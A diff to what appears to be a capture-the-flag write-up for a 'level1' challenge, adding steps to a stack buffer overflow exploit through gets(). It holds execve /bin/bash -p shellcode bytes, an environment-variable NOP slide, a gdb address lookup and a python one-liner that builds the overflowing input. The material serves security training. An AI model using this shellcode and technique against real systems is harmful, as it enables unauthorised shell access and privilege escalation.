@@ -13,14 +13,19 @@ disassembly of the main gives:
 
 so:
 (This is some shellcode)
-echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" > shellcode
+echo -ne "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" > /tmp/shellcode
 
 (we put our shellcode in our environment, we also prepend it with a NOP slide to make it easier)
 export SHELLCODE="`python -c 'import sys; sys.stdout.write("\x90" * 50000)'``cat shellcode`"
 
 go get the rough estimate of the position of the environment in the address space of the program:
 (in gdb)
+start
 print getenv("SHELLCODE")
 
-We now can create some file, containing multiple times this address encoded in binary, that will be given as STDIN to the program.
+We now can create some file, containing multiple times this address encoded in binary, that will be given as STDIN to the program:
+
+python -c 'import sys; sys.stdout.write(<Address in hexa form> * 22)' > /tmp/input
+cat /tmp/input - | ./level1
+
 The gets will then read too much on the stack, putting our address in the popping position for the ret instruction.
